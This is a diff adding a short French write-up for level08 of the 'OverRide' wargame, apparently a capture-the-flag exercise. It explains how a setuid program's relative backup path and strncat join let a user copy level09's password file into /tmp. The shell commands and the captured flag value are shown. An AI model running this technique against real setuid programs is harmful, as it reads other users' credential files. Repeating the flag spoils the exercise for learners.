@@ -1,0 +1,17 @@
+On voit dans le code que la premiere chose que fait le programme est de open
+./backups/.log a partir donc du repertoir courant.
+la faille que nous avons exploité est l'association du fopen (ligne 25) qui va lire
+dans le fichier que nous lui indiquons en 1er argument et celle du strncat (ligne 34)
+qui regroupe "./backups" et l'av[1] pour former un chemin dans lequels on ira
+ecrire dans un fichier qui portera le meme nom que celui lue.
+
+On a donc commencé par creer dans /tmp un dossier /backups/home/level09 ensuite,
+tout en restant dans le dossier /tmp on a executer level8 avec ce path créé
+comme argument. ce qui donne:
+
+
+    level08@OverRide:~$ cd /tmp
+    level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
+    level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+    level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+    fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
